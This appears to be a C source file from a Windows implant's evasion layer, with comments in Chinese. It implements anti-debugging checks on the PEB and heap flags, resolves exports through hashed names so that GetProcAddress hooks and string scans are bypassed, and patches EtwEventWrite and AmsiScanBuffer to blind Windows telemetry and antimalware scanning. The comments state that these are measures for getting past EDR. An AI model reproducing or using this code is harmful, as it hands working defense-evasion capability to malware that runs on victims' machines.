/*
 * agent_windows/src/defend_win.c
 *
 * Windows 对抗检测集成层（G3）实现。
 *
 * 本文件是纯 C99，不含任何 Windows API —— 平台专属能力全部走回调
 * （模块基址 / 页保护 / PEB 读取）。因此可在 Linux 上真编译、真测试；
 * Windows 真机只需填回调实现（PEB->Ldr 遍历、VirtualProtect、读 GS 段）。
 *
 * 复用的既有能力：
 *   17_loader  pe_parse / pe_export_by_name   —— 导出表解析
 *   19_defense df_evade_etw / df_evade_amsi   —— 桩字节
 * 二者都不在本文件重写。
 *
 * 为什么解析不走 GetProcAddress / GetModuleHandle：
 *   这两个 API 本身是 EDR 最常见的用户态 hook 点。用它解析再打桩，
 *   等于先告诉监控方"我要动 EtwEventWrite 了"。走 PEB + 导出表是
 *   自研绕过与抄公开 PoC 的分界线。
 */
#include "defend_win.h"

#include "defense.h"
#include "loader.h"

#include <string.h>

const char *dw_errstr(int e)
{
    switch (e) {
    case DW_OK:            return "ok";
    case DW_ERR_ARG:       return "invalid argument";
    case DW_ERR_NOMODULE:  return "module not loaded";
    case DW_ERR_NOEXPORT:  return "export not found";
    case DW_ERR_PROTECT:   return "memory protect failed";
    case DW_ERR_PATCH:     return "patch write failed";
    case DW_ERR_UNSAFE:    return "environment unsafe";
    default:               return "unknown";
    }
}

/* ====================================================================
 * 反调试：PEB / 堆标志
 *
 * 偏移按 x86-64：
 *   PEB+0x02  BeingDebugged
 *   PEB+0x30  ProcessHeap
 *   PEB+0xBC  NtGlobalFlag
 *   Heap+0x70 Flags
 *   Heap+0x74 ForceFlags
 * 判定依据的不是"有没有某个值"，而是"是否与正常进程应有的值不符"：
 * 正常进程 BeingDebugged=0、NtGlobalFlag=0、HeapFlags 为 HEAP_GROWABLE(2)、
 * ForceFlags=0。调试器附加会置位其中若干项。
 * ==================================================================== */

#define PEB_OFF_BEINGDEBUGGED   0x02u
#define PEB_OFF_NTGLOBALFLAG    0xBCu
#define HEAP_OFF_FLAGS          0x70u
#define HEAP_OFF_FORCEFLAGS     0x74u
#define HEAP_MIN_LEN            0x78u

/* FLG_HEAP_ENABLE_TAIL_CHECK | FREE_CHECK | VALIDATE_PARAMETERS */
#define NT_GLOBAL_DEBUG_MASK    0x70u
#define HEAP_FLAGS_NORMAL       0x02u  /* HEAP_GROWABLE */

static uint32_t rd32_at(const uint8_t *p, size_t off)
{
    return (uint32_t)p[off] | ((uint32_t)p[off + 1] << 8) |
           ((uint32_t)p[off + 2] << 16) | ((uint32_t)p[off + 3] << 24);
}

int dw_debug_peb(const uint8_t *peb, size_t peb_len,
                 const uint8_t *heap, size_t heap_len,
                 dw_debug_info_t *out)
{
    if (!out) return DW_ERR_ARG;

    memset(out, 0, sizeof *out);

    if (!peb || peb_len < DW_PEB_MIN_LEN) return DW_ERR_ARG;

    out->valid          = 1;
    out->being_debugged = peb[PEB_OFF_BEINGDEBUGGED];
    out->nt_global_flag = rd32_at(peb, PEB_OFF_NTGLOBALFLAG);

    if (heap && heap_len >= HEAP_MIN_LEN) {
        out->heap_flags  = rd32_at(heap, HEAP_OFF_FLAGS);
        out->force_flags = rd32_at(heap, HEAP_OFF_FORCEFLAGS);
    }

    if (out->being_debugged != 0)                          out->verdict = 1;
    if (out->nt_global_flag & NT_GLOBAL_DEBUG_MASK)        out->verdict = 1;
    if (out->force_flags != 0)                             out->verdict = 1;
    /* 正常进程只有 HEAP_GROWABLE；高于它说明堆被调试器调整过 */
    if (out->heap_flags & ~HEAP_FLAGS_NORMAL)              out->verdict = 1;

    return DW_OK;
}

/* ====================================================================
 * 导出解析（不走 GetProcAddress）
 * ==================================================================== */
int dw_resolve_export(const uint8_t *mod_base, size_t mod_size,
                      const char *func, uint8_t **out_addr)
{
    pe_image_t img;
    uint32_t   rva = 0;
    int        r;

    if (!mod_base || !func || !out_addr) return DW_ERR_ARG;
    if (mod_size < 64)                   return DW_ERR_ARG;

    *out_addr = NULL;

    r = pe_parse(mod_base, mod_size, &img);
    if (r != LD_OK) return DW_ERR_ARG;

    r = pe_export_by_name(&img, func, &rva);
    if (r != LD_OK) return DW_ERR_NOEXPORT;
    if (rva == 0)   return DW_ERR_NOEXPORT;

    /* 导出 RVA 必须落在映像内，否则是指向转发串或已损坏 */
    if ((size_t)rva >= mod_size) return DW_ERR_NOEXPORT;

    *out_addr = (uint8_t *)((uintptr_t)mod_base + (uintptr_t)rva);
    return DW_OK;
}

/* djb2：与头文件里的 DW_HASH_* 常量一致 */
uint32_t dw_hash_name(const char *s)
{
    uint32_t h = 5381u;
    if (!s) return 0;
    while (*s) {
        h = ((h << 5) + h) + (uint32_t)(unsigned char)*s++;
    }
    return h;
}

int dw_resolve_export_h(const uint8_t *mod_base, size_t mod_size,
                        uint32_t name_hash, uint8_t **out_addr)
{
    pe_image_t img;
    uint32_t   nfunc = 0, nnames = 0, i;
    int        r;

    if (!mod_base || !out_addr) return DW_ERR_ARG;
    if (mod_size < 64)          return DW_ERR_ARG;
    if (name_hash == 0)         return DW_ERR_ARG;

    *out_addr = NULL;

    r = pe_parse(mod_base, mod_size, &img);
    if (r != LD_OK) return DW_ERR_ARG;

    r = pe_export_count(&img, &nfunc, &nnames);
    if (r != LD_OK) return DW_ERR_ARG;

    for (i = 0; i < nnames; i++) {
        char     nm[PE_IMPORT_FUNC_MAX];
        uint32_t ord = 0, frva = 0;

        r = pe_export_name_by_index(&img, i, nm, sizeof(nm), &ord);
        if (r != LD_OK) continue;
        if (dw_hash_name(nm) != name_hash) continue;

        r = pe_export_rva_by_index(&img, ord, &frva);
        if (r != LD_OK) return DW_ERR_NOEXPORT;
        if (frva == 0 || (size_t)frva >= mod_size) return DW_ERR_NOEXPORT;

        *out_addr = (uint8_t *)((uintptr_t)mod_base + (uintptr_t)frva);
        return DW_OK;
    }
    return DW_ERR_NOEXPORT;
}

/* ====================================================================
 * 单符号打桩：解析 -> 改保护 -> 打桩 -> 恢复保护
 * ==================================================================== */
/*
 * 给定已解析地址，完成：改保护 -> 打桩 -> 恢复保护。
 * 按名与按哈希两条路径共用这一段，避免两处各写一遍而行为分叉。
 */
static int dw_patch_addr(const dw_ctx_t *ctx, uint8_t *addr,
                         dw_target_t target, dw_patch_result_t *out)
{
    int old_prot = DW_PROT_NONE;
    int r;

    r = ctx->prot_fn(addr, DW_PATCH_WINDOW, DW_PROT_RWX, ctx->ud, &old_prot);
    if (r != DW_OK) return DW_ERR_PROTECT;

    if (out) { out->addr = addr; out->old_prot = old_prot; }

    if (target == DW_T_ETW)
        r = df_evade_etw(addr, DW_PATCH_WINDOW, 0);
    else
        r = df_evade_amsi(addr, DW_PATCH_WINDOW, 0);

    if (r != DF_OK) {
        /* 打桩失败也必须把保护还原——不能因为失败就留下 RWX 页 */
        ctx->prot_fn(addr, DW_PATCH_WINDOW, old_prot, ctx->ud, NULL);
        return DW_ERR_PATCH;
    }

    /* 硬规则 2：恢复失败同样算失败。残留可写可执行页是 EDR 的强特征。 */
    r = ctx->prot_fn(addr, DW_PATCH_WINDOW, old_prot, ctx->ud, NULL);
    if (r != DW_OK) return DW_ERR_PROTECT;

    if (out) out->restored = 1;

    return DW_OK;
}

int dw_patch_symbol(const dw_ctx_t *ctx, const char *mod, const char *func,
                    dw_target_t target, dw_patch_result_t *out)
{
    uint8_t *base = NULL;
    size_t   size = 0;
    uint8_t *addr = NULL;
    int      r;

    if (!ctx || !ctx->mod_fn || !ctx->prot_fn || !mod || !func) return DW_ERR_ARG;

    if (out) {
        memset(out, 0, sizeof *out);
        out->target = target;
    }

    r = ctx->mod_fn(mod, ctx->ud, &base, &size);
    if (r != DW_OK) return r;   /* 保留 NOMODULE 语义，交由上层区分必打/可选 */

    r = dw_resolve_export(base, size, func, &addr);
    if (r != DW_OK) return r;

    return dw_patch_addr(ctx, addr, target, out);
}

/*
 * 按名字哈希打桩。产品路径应当走这一条：
 * 函数名不出现在二进制里，静态扫描无法从字符串判定目标符号。
 */
int dw_patch_symbol_h(const dw_ctx_t *ctx, const char *mod, uint32_t func_hash,
                      dw_target_t target, dw_patch_result_t *out)
{
    uint8_t *base = NULL;
    size_t   size = 0;
    uint8_t *addr = NULL;
    int      r;

    if (!ctx || !ctx->mod_fn || !ctx->prot_fn || !mod) return DW_ERR_ARG;
    if (func_hash == 0) return DW_ERR_ARG;

    if (out) {
        memset(out, 0, sizeof *out);
        out->target = target;
    }

    r = ctx->mod_fn(mod, ctx->ud, &base, &size);
    if (r != DW_OK) return r;

    r = dw_resolve_export_h(base, size, func_hash, &addr);
    if (r != DW_OK) return r;

    return dw_patch_addr(ctx, addr, target, out);
}

/*
 * 全哈希打桩：模块与函数都按哈希定位，二进制中无明文符号。
 * 走哈希还是按名由 ctx->mode 【显式】决定，不看回调指针是否为空 ——
 * 后者在调用方漏清零时会把野指针当有效回调调用，造成随机崩溃。
 *   BY_HASH -> mod_h_fn
 *   BY_NAME -> mod_fn
 * （-DDW_NO_PLAINNAME 下按名分支被剔除，只允许 BY_HASH。）
 */
static int dw_patch_h(const dw_ctx_t *ctx, uint32_t mod_hash,
                      uint32_t func_hash, dw_target_t target,
                      dw_patch_result_t *out)
{
    uint8_t *base = NULL;
    size_t   size = 0;
    uint8_t *addr = NULL;
    int      r;

    if (!ctx || !ctx->prot_fn) return DW_ERR_ARG;
    if (func_hash == 0)        return DW_ERR_ARG;

    if (out) {
        memset(out, 0, sizeof *out);
        out->target = target;
    }

#ifndef DW_NO_PLAINNAME
    if (ctx->mode == DW_MOD_BY_HASH) {
        if (!ctx->mod_h_fn) return DW_ERR_ARG;   /* 声明用哈希却没给回调 */
        r = ctx->mod_h_fn(mod_hash, ctx->ud, &base, &size);
    } else {
        const char *nm = (mod_hash == DW_HASH_NTDLL)     ? "ntdll.dll"
                       : (mod_hash == DW_HASH_AMSI_DLL)  ? "amsi.dll"
                       : NULL;
        if (!nm || !ctx->mod_fn) return DW_ERR_ARG;
        r = ctx->mod_fn(nm, ctx->ud, &base, &size);
    }
#else
    /* 明文剔除构建：只认哈希路径，按名分支不存在 */
    if (ctx->mode != DW_MOD_BY_HASH || !ctx->mod_h_fn) return DW_ERR_ARG;
    r = ctx->mod_h_fn(mod_hash, ctx->ud, &base, &size);
#endif
    if (r != DW_OK) return r;   /* 保留 NOMODULE，交由上层区分必打/可选 */

    r = dw_resolve_export_h(base, size, func_hash, &addr);
    if (r != DW_OK) return r;

    return dw_patch_addr(ctx, addr, target, out);
}

/* ====================================================================
 * 编排
 * ==================================================================== */
int dw_defend_all(const dw_ctx_t *ctx, dw_report_t *rep)
{
    dw_report_t   local;
    dw_debug_info_t dbg;
    uint8_t       peb[DW_PEB_MIN_LEN];
    int           r;

    if (!ctx) return DW_ERR_ARG;
    if (!rep) rep = &local;
    memset(rep, 0, sizeof *rep);

    /* ---- 1. 反调试 ---- */
    if (ctx->peb_fn) {
        memset(peb, 0, sizeof peb);
        r = ctx->peb_fn(peb, sizeof peb, ctx->ud);
        if (r != DW_OK) return r;
        r = dw_debug_peb(peb, sizeof peb, NULL, 0, &dbg);
        if (r != DW_OK) return r;
        rep->dbg = dbg;
        /* 环境不安全即拒绝运行：在不安全环境里留下采集痕迹不值得 */
        if (dbg.verdict != 0) return DW_ERR_UNSAFE;
    }

    /* ---- 2. ETW（必打） ---- */
    r = dw_patch_h(ctx, DW_HASH_NTDLL, DW_HASH_ETW_EVENT_WRITE,
                   DW_T_ETW, &rep->etw);
    if (r != DW_OK) return r;   /* 硬规则 4：解析不到不得静默跳过 */

    /* ---- 3. AMSI（可选） ---- */
    r = dw_patch_h(ctx, DW_HASH_AMSI_DLL, DW_HASH_AMSI_SCAN_BUFFER,
                   DW_T_AMSI, &rep->amsi);
    if (r == DW_ERR_NOMODULE) {
        /* 硬规则 3：模块未加载 = 无需修补，不是失败。
         * 纯 C/C++ 进程或非 PowerShell 宿主里 amsi.dll 常常不在。
         * 把 NOTFOUND 当失败会让植入体在干净机器上拒绝运行。 */
        rep->amsi_absent = 1;
        rep->amsi.rc     = DW_ERR_NOMODULE;
        return DW_OK;
    }
    if (r != DW_OK) return r;
    rep->amsi.rc = DW_OK;

    return DW_OK;
}
